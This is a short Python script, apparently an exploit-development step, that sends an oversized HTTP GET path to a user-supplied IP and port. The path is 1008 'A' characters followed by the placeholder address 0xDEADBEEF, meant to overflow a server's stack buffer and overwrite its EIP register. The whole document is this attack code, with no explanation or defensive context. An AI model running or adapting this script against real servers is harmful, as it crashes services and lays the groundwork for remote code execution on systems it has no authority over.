# Overrides eip with eipaddr

import sys, socket, time

# Use in the form "python httpeipovr.py  "

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

eipaddr = "\xEF\xBE\xAD\xDE"
pattern = "A" * 1008 + eipaddr

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address

command = "GET /" +  pattern  + " HTTP/1.1\r\nHost: "+ host + "\r\nConnection: Close\r\n\r\n"
client.send(command) # Send the command

data = client.recv(1024) # Recieve Reply

client.close() # Close the Connection

